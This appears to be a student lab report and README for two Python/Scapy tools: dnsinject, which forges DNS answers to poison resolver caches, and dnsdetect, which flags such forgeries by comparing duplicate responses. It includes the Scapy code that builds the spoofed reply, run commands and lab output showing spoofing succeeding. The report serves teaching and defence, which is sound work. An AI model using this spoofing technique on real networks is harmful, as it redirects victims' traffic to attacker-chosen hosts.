DNS Packet Injection

Rahul Sihag

-------------------------------------------------------------------------------

Description:
____________

Part 1: DNS packet injector

Captures the traffic from a network interface in promiscuous mode, and attempt
to inject forged responses to selected DNS A requests with the goal to poison
the resolver's cache.

dnsinject [-i interface] [-h hostnames] expression

-i  Listen on network device <interface> (e.g., eth0). If not specified,
    dnsinject selects a default interface to listen on. The same
    interface is used for packet injection.

-h  Read a list of IP address and hostname pairs specifying the hostnames to
    be hijacked. If '-h' is not specified, dnsinject forge replies for all
    observed requests with the local machine's IP address as an answer.
    
<expression> is a BPF filter that specifies a subset of the traffic to be
monitored. This option is useful for targeting a single or a set of particular
victims.

My DNS Injector is quite fast. Works well if Query time from actual server is >=10 msec for most of the times.


Part 2: DNS poisoning attack detector

Captures the traffic from a network interface in promiscuous mode and detect DNS poisoning attack attempts, such as those generated by dnsinject.
Detection is based on identifying duplicate responses towards the same destination that contain different answers for the same A request, i.e., 
the  observation of the attacker's spoofed response followed by the server's actual response. False positivites are detected based on TTL values.
If two responses for the same request are same, its a retransmission case. If they are different and TTL value is also different then one of them
is a forged response.

dnsdetect [-i interface] [-r tracefile] expression

-i  Listen on network device <interface> (e.g., eth0). If not specified,
    the program selects a default interface to listen on.

-r  Read packets from <tracefile> (tcpdump format). Useful for detecting
    DNS poisoning attacks in existing network traces.

<expression> is a BPF filter that specifies a subset of the traffic to be
monitored.



Design:
-------
Code is written in Python and Scapy library is used.

Part A:
Read the hostnames file(if any) and parse the data in a dictionary. Packets are sniffed on the given interface or default interface and callback function is called with BPF filter combined with "port 53" i.e. DNS filter. A forged packet with answer from hostnames dictionary or local machine's IP is sent to the victim as a response. All the data parsing, getting local ip etc. part is done in the main function itself to avoiding delaying the forged response. In callback only the packet is framed with proper attributes and thus it is able to send the forged response in <10 msec time.
Forged response is created like shown below. TTL is set to 10 msec:

spoofResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                              DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, ra=1, qr=1, aa=1, ancount=1, qdcount=1, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=answer_ip))

Part B:
Packets are sniffed from the interface in promiscous mode or from the pcap file in offline mode(.pcap file). If two or more responses for the same request are same, its a retransmission case. If they are different and TTL value is also different then one of them is a forged response. DNS.pcap file is included to test the offline part. If responses are different but TTL is same then it is assumed to be a genuine response as TTL pair is unique for a particular request and randomly guessing same TTL is very hard for an injector.
First time a response comes it is stored in a dictionary with the below attributes as key:
(pkt[IP].dst,pkt[IP].sport,pkt[IP].dport,pkt[DNS].id,pkt[DNS].qd.qname) 

Now if another response comes for the same request it is checked in the dictionary and if it already exists and the new one is with different TTL alert is shown on stdout.


For sites like two.com there is no answer section in original packet from DNS server and such cases have been handled correctly. It throws the same on stdout.

False Positives - taken care using TTL as explained above. If two responses are different and TTL doesn't match only then dnsdetect prints an alert.
---------------				  



How to Compile/Run:
--------------------
1. Make sure scapy and netifaces is installed in the system. Steps to install scapy/netifaces given below.
2. To run dnsinject:

sudo python dnsinject.py [-i interface] [-h hostnames] expression				-Order of arguments needs to be maintained.

3. To run dnsdetect: 

sudo python dnsdetect.py [-i interface] [-r tracefile] expression 				-Order of arguments needs to be maintained. Either interface or tracefile to be specified.

Examples:

Part 1 - dnsinject

All interfaces:
sudo python dnsinject.py

en0 interface with hostname 
sudo python dnsinject.py -i en0 -h hostnames

en0 interface and bpf filter
sudo python dnsinject.py -i en0 "src 172.31.232.187"

Part 2 - dnsdetect

All interfaces and dns traffic
sudo python dnsdetect.py 'udp port 53'

eno interface and dns traffic
sudo python dnsdetect.py -i en0 'udp port 53'

pcap file
sudo python dnsdetect.py -r DNS.pcap


Environment Details:
--------------------
dnsdetect and dnsinject running on MacOS Sierra Version 10.12.6 (16G29). I am querying from VM (Ubuntu - 17.10). Also ran dnsdetect from VM from where DNS request is sent.
Python Version: Python 2.7.10



Output:
_______

####### TC1:

Part A:
rahuls-MacBook-Pro:NetSecAss4 rsihag$ python sniff.py -i en0 "src 172.31.232.187"
Interface: en0 Hostnames: None Expression: ['src 172.31.232.187'] Local IP: 172.31.233.45
Hostnames: {}
.
Sent 1 packets.
Sent Spoofed Packet:  IP / UDP / DNS Ans "172.31.233.45"  For Request: apple.com. From: 172.31.232.187 TXID: 0x5d6f
.
Sent 1 packets.
Sent Spoofed Packet:  IP / UDP / DNS Ans "172.31.233.45"  For Request: iiit.ac.in. From: 172.31.232.187 TXID: 0xd026

Part B:
rahuls-MacBook-Pro:NetSecAss4 rsihag$ python sniff2.py -i en0
Interface: en0 Tracefile: None Expression: 
Sniffing on Interface: en0
****************************************************************
2017-12-10 15:33 DNS Poisoning Attempt
TXID 0x5d6f Request apple.com.
Answer1 ['17.172.224.47', '17.178.96.59', '17.142.160.59']
Answer2 ['172.31.233.45']
****************************************************************
****************************************************************
2017-12-10 15:33 DNS Poisoning Attempt
TXID 0xd026 Request iiit.ac.in.
Answer1 ['172.31.233.45']
Answer2 ['196.12.53.50']
****************************************************************

DIG Output:
ubuntu@ubuntu:~$ dig apple.com

; <<>> DiG 9.10.3-P4-Ubuntu <<>> apple.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54722
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;apple.com.			IN	A

;; ANSWER SECTION:
apple.com.		736	IN	A	17.172.224.47
apple.com.		736	IN	A	17.178.96.59
apple.com.		736	IN	A	17.142.160.59

;; Query time: 4 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: Sun Dec 10 20:33:04 UTC 2017
;; MSG SIZE  rcvd: 86

ubuntu@ubuntu:~$ dig iiit.ac.in

; <<>> DiG 9.10.3-P4-Ubuntu <<>> iiit.ac.in
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 63333
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;iiit.ac.in.			IN	A

;; ANSWER SECTION:
iiit.ac.in.		10	IN	A	172.31.233.45           --- Forged Response Sent as Query time > 10 msec

;; Query time: 22 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: Sun Dec 10 20:33:34 UTC 2017
;; MSG SIZE  rcvd: 55



####### TC2:
Part 1:
rahuls-MacBook-Pro:NetSecAss4 rsihag$ python dnsinject.py -i en0 -h hostnames 
Interface: en0 Hostnames: hostnames Expression: [] Local IP: 172.31.233.45
Hostnames: {'cs.stonybrook.edu': '192.168.66.6', 'www.bar.example.com': '10.6.6.6', 'www.cs.stonybrook.edu': '192.168.66.6', 'foo.example.com': '10.6.6.6', 'bar.example.com': '10.6.6.6', 'www.foo.example.com': '10.6.6.6'}
.
Sent 1 packets.
Sent Spoofed Packet:  IP / UDP / DNS Ans "192.168.66.6"  For Request: www.cs.stonybrook.edu. From: 172.31.232.187 TXID: 0xe8f8

Part 2:
rahuls-MacBook-Pro:NetSecAss4 rsihag$ python dnsdetect.py
Interface: None Tracefile: None Expression: 
****************************************************************
2017-12-10 16:33 DNS Poisoning Attempt
TXID 0xe8f8 Request www.cs.stonybrook.edu.
Answer1 ['192.168.66.6']
Answer2 ['107.22.178.157']
****************************************************************

DIG Output:
ubuntu@ubuntu:~$ dig www.cs.stonybrook.edu @77.88.8.8

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.cs.stonybrook.edu @77.88.8.8
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59640
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;www.cs.stonybrook.edu.		IN	A

;; ANSWER SECTION:
www.cs.stonybrook.edu.	10	IN	A	192.168.66.6

;; Query time: 23 msec
;; SERVER: 77.88.8.8#53(77.88.8.8)
;; WHEN: Sun Dec 10 21:33:27 UTC 2017
;; MSG SIZE  rcvd: 76


####### TC3 - dnsdetect on pcap file

-MacBook-Pro:NetSecAss4 rsihag$ python dnsdetect.py -r DNS.pcap 
Interface: None Tracefile: DNS.pcap Expression: 
Sniffing from Tracefile: DNS.pcap
reading from file DNS.pcap, link-type EN10MB (Ethernet)
****************************************************************
2017-12-10 16:41 DNS Poisoning Attempt
TXID 0xfea1 Request www.cs.stonybrook.edu.
Answer1 ['192.168.66.6']
Answer2 ['107.22.178.157']
****************************************************************
****************************************************************
2017-12-10 16:41 DNS Poisoning Attempt
TXID 0x46b0 Request www.bar.example.com.
Answer1 ['10.6.6.6']
Answer2 []
****************************************************************
****************************************************************
2017-12-10 16:41 DNS Poisoning Attempt
TXID 0x7d90 Request www.foo.example.com.
Answer1 []
Answer2 ['10.6.6.6']
****************************************************************
****************************************************************
2017-12-10 16:41 DNS Poisoning Attempt
TXID 0xbbce Request www.cs.stonybrook.edu.
Answer1 ['107.22.178.157']
Answer2 ['192.168.66.6']
****************************************************************

Testing has been done thoroughly and all works perfectly.


Limitations/Bugs:
------------

There is some issue with applying BPF filter with scapy library. If we use git version of the library it works perfectly, but not with the stable one. 


Included Files:
---------------
dnsdetect.py - dnsdetect source code
dnsinject.py - dnsinject source code
DNS.pcap - pcap file
hostnames - files containing IP and hostname pair per line separated by whitespace.
report.txt - Detailed Description


Instructions for installing libraries/dependencies:
---------------------------------------------------
0.1  sudo apt-get install python-setuptools python-dev build-essential
0.2  sudo easy_install pip  											- if pip is not installed
1. sudo pip install netifaces
2. sudo pip install scapy


References:
-----------

https://mediatemple.net/community/products/dv/204644130/understanding-the-dig-command
https://thepacketgeek.com/scapy-p-09-scapy-and-dns/
https://pypi.python.org/pypi/netifaces/
https://thepacketgeek.com/tag/scapy/
https://docs.python.org/2/library/getopt.html
Multiple stackoverflow, github resources on scapy and python.




